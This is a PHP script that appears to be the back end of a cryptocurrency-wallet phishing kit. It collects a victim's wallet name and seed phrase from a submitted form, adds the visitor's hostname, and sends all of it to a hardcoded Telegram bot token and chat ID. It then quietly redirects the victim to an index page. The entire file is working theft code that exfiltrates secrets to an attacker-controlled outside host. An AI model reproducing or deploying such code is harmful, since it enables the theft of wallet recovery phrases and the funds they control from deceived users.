<?php

// Function to send message to Telegram bot
function sendToTelegram($message) {

    global $bt, $cID; // $bt and $cID are defined in 'tgreceive.php'

    $botToken = '8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE';
    $chatID = '6837437455';
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message);

    // Send the message using cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Check if message was sent successfully
    if (!$response) {
        return false;
    }

    return true;
}

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    
    // Extract form data
    $wal_name = $_POST['wal_name'];
    $phrase = $_POST['phrase'];
    $host = gethostbyaddr($_SERVER["REMOTE_ADDR"]);

    // Prepare message to send to Telegram
    $telegramMessage = "New Phrase Info--------------------------------------+----\n\n
    Wallet: $wal_name\n
    Phrase: $phrase\n\n
    Host: $host\n
    \n+-----------------------------------------------------------------+";

    // Send message to Telegram
    if (sendToTelegram($telegramMessage)) {
        header("Location: ../index.html");
    } else {
        echo "Your Information Could not be submitted, Please try again";
    }
}
?>